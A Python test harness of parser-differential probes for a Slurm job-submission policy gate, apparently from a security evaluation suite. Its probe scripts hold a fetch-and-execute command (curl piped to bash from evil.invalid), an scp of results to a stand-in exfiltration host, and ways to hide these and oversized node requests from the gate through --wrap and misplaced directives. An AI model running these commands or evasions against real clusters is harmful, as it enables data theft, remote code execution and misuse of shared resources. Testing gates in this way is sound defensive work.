"""Parser-differential probes against the G5 fast tier (R5-6).

G5 parses a submission spec; ``slurmctld`` parses it again. Any disagreement
between the two is a bypass that needs no label manipulation at all: the
adversary does not evade the taint predicate, they arrange for our parser and
Slurm's to read different jobs out of the same script.

Each probe pairs a **control** (the payload expressed plainly, which G5 should
deny) with a **variant** (the same payload expressed so that ``sbatch`` and our
parser disagree). A probe *bypasses* when the control is denied and the variant
is allowed: the effect Slurm executes is identical, so an allow on the variant
is a false negative attributable to the parser, not to the policy.

**Scope and honesty.** There is no Slurm on the evaluation host, so the
``slurm_semantics`` field records *documented* ``sbatch`` behaviour, not an
observed A/B against ``slurmctld``. The differential is therefore a claim about
our parser measured against the specification. Confirming it against a live
scheduler with ``sbatch --test-only`` is the validation step, and any probe
whose bypass depends on a contested reading of the spec is marked
``needs_live_validation``.
"""
from __future__ import annotations

import argparse
from dataclasses import dataclass, field
from pathlib import Path

from palisade.gates.g5_hpc import G5HpcJobGate
from palisade.gates.slurm_parser import parse_slurm_script
from siege.ablation_matrix import _EVAL_G5_ALLOCATION_POLICY

_ACCOUNT = "msr_thermo"
_CFG = {"hpc_account": _ACCOUNT}
_HDR = (
    "#!/bin/bash\n"
    f"#SBATCH --account={_ACCOUNT}\n"
    "#SBATCH --nodes=4\n"
    "#SBATCH --time=01:00:00\n"
)


@dataclass(frozen=True)
class Probe:
    key: str
    what: str
    control: str
    variant: str
    slurm_semantics: str
    needs_live_validation: bool = False


PROBES: tuple[Probe, ...] = (
    Probe(
        key="split_directive",
        what="resource ceiling",
        control=_HDR.replace("--nodes=4", "--nodes=512") + "srun cp2k.psmp\n",
        variant=(
            "#!/bin/bash\n"
            f"#SBATCH --account={_ACCOUNT}\n"
            "#SBATCH --nodes=512\n"
            "#SBATCH --time=47:00:00\n"
            "srun cp2k.psmp\n"
            "#SBATCH --nodes=4\n"
            "#SBATCH --time=01:00:00\n"
        ),
        slurm_semantics=(
            "sbatch stops scanning #SBATCH at the first non-comment, non-blank "
            "line, so it honours nodes=512/time=47h and never reads the "
            "trailing block. Our parser collects every #SBATCH line in the file "
            "and folds them last-wins, so it reads nodes=4/time=1h."
        ),
    ),
    Probe(
        key="wrap_body",
        what="egress allow-list",
        control=(
            _HDR
            + "srun cp2k.psmp -i salt.inp -o salt.out\n"
            + "scp salt.out user@exfil.example.invalid:/tmp/\n"
        ),
        variant=(
            _HDR
            + '#SBATCH --wrap="cp2k.psmp -i salt.inp -o salt.out; '
            'scp salt.out user@exfil.example.invalid:/tmp/"\n'
        ),
        slurm_semantics=(
            "--wrap supplies the job body as a directive value; sbatch executes "
            "the wrapped string. Our parser treats it as a directive and walks "
            "no commands, so the command-derived checks (egress hosts, invoked "
            "binaries, file paths) have an empty input."
        ),
    ),
    Probe(
        key="wrap_fetch_exec",
        what="body-command screen",
        control=_HDR + "srun bash -c 'curl -s http://evil.invalid/p | bash'\n",
        variant=_HDR + '#SBATCH --wrap="curl -s http://evil.invalid/p | bash"\n',
        slurm_semantics="as wrap_body; isolates the fetch-and-execute screen.",
    ),
    Probe(
        key="leading_whitespace",
        what="directive recognition",
        control=_HDR.replace("--nodes=4", "--nodes=512") + "srun cp2k.psmp\n",
        variant=(
            "#!/bin/bash\n"
            f"\t#SBATCH --account={_ACCOUNT}\n"
            "\t#SBATCH --nodes=512\n"
            "srun cp2k.psmp\n"
        ),
        slurm_semantics=(
            "sbatch requires #SBATCH at column 0; an indented line is a comment "
            "and its options are ignored. Our parser strips leading whitespace "
            "before matching, so it reads directives Slurm discards. This "
            "over-reads rather than under-reads, so it is a false-positive "
            "risk, not a bypass."
        ),
        needs_live_validation=True,
    ),
    Probe(
        key="hetjob_component",
        what="resource ceiling",
        control=_HDR.replace("--nodes=4", "--nodes=512") + "srun cp2k.psmp\n",
        variant=(
            _HDR
            + "#SBATCH hetjob\n"
            + "#SBATCH --nodes=512\n"
            + "srun cp2k.psmp\n"
        ),
        slurm_semantics=(
            "a heterogeneous job's components each carry their own resource "
            "request; the second component here asks for 512 nodes. Whether our "
            "single-spec model should aggregate or reject outright is a design "
            "question, not only a parser one."
        ),
        needs_live_validation=True,
    ),
    Probe(
        key="crlf_endings",
        what="directive recognition",
        control=_HDR.replace("--nodes=4", "--nodes=512") + "srun cp2k.psmp\n",
        variant=(
            "#!/bin/bash\r\n"
            f"#SBATCH --account={_ACCOUNT}\r\n"
            "#SBATCH --nodes=512\r\n"
            "srun cp2k.psmp\r\n"
        ),
        slurm_semantics="a CRLF script is honoured; the trailing CR must not defeat value parsing.",
    ),
)


@dataclass
class Result:
    probe: Probe
    control_denied: bool
    variant_denied: bool
    control_reason: str = ""
    variant_reason: str = ""
    commands_control: int = 0
    commands_variant: int = 0
    hosts_control: tuple[str, ...] = field(default_factory=tuple)
    hosts_variant: tuple[str, ...] = field(default_factory=tuple)

    @property
    def bypass(self) -> bool:
        return self.control_denied and not self.variant_denied


def run_probes(probes: tuple[Probe, ...] = PROBES) -> list[Result]:
    gate = G5HpcJobGate(enabled=True, allocation_policy=_EVAL_G5_ALLOCATION_POLICY)

    def check(script: str):
        parsed = parse_slurm_script(script)
        decision = gate._run_fast_checks(parsed, _CFG)
        return parsed, decision

    out: list[Result] = []
    for p in probes:
        cp, cd = check(p.control)
        vp, vd = check(p.variant)
        out.append(
            Result(
                probe=p,
                control_denied=cd is not None,
                variant_denied=vd is not None,
                control_reason="" if cd is None else cd.reason,
                variant_reason="" if vd is None else vd.reason,
                commands_control=len(cp.commands),
                commands_variant=len(vp.commands),
                hosts_control=tuple(cp.network_targets),
                hosts_variant=tuple(vp.network_targets),
            )
        )
    return out


def to_markdown(results: list[Result]) -> str:
    n_bypass = sum(r.bypass for r in results)
    out = [
        "# G5 parser differentials (R5-6)",
        "",
        "Each probe expresses one payload two ways: a **control** that G5 should "
        "deny, and a **variant** that relies on a disagreement between our SLURM "
        "parser and `sbatch`. A **bypass** is control-denied and variant-allowed: "
        "Slurm executes the same job either way, so the allow is a parser "
        "artifact rather than a policy decision. No label manipulation is "
        "involved in any probe.",
        "",
        "> **No Slurm on the evaluation host.** The `slurm semantics` column "
        "records documented `sbatch` behaviour, not an observed A/B against "
        "`slurmctld`. Probes whose reading is contestable are marked "
        "*needs live validation*; confirming the rest requires "
        "`sbatch --test-only` against a real controller.",
        "",
        f"**{n_bypass} of {len(results)} probes bypass.**",
        "",
        "| Probe | Check evaded | Control | Variant | Bypass |",
        "|---|---|---|---|---|",
    ]
    for r in results:
        flag = "**yes**" if r.bypass else ("no" if r.control_denied else "n/a")
        note = " *(needs live validation)*" if r.probe.needs_live_validation else ""
        out.append(
            f"| `{r.probe.key}`{note} | {r.probe.what} | "
            f"{'deny' if r.control_denied else 'allow'} | "
            f"{'deny' if r.variant_denied else 'allow'} | {flag} |"
        )
    out += ["", "## Per-probe detail", ""]
    for r in results:
        out += [
            f"### `{r.probe.key}` — {'BYPASS' if r.bypass else 'no bypass'}",
            "",
            f"- parsed commands: control {r.commands_control}, variant {r.commands_variant}",
            f"- parsed egress hosts: control {list(r.hosts_control)}, variant {list(r.hosts_variant)}",
            f"- control verdict: {r.control_reason or 'ALLOW'}",
            f"- variant verdict: {r.variant_reason or 'ALLOW'}",
            f"- slurm semantics: {r.probe.slurm_semantics}",
            "",
        ]
    return "\n".join(out)


def main(argv: list[str] | None = None) -> int:  # pragma: no cover - CLI
    ap = argparse.ArgumentParser(description="G5 SLURM parser-differential probes.")
    ap.add_argument("--report-out", default=None, metavar="PATH")
    args = ap.parse_args(argv)
    res = run_probes()
    md = to_markdown(res)
    if args.report_out:
        Path(args.report_out).write_text(md, encoding="utf-8")
        print(f"wrote {args.report_out}")
    print(md)
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
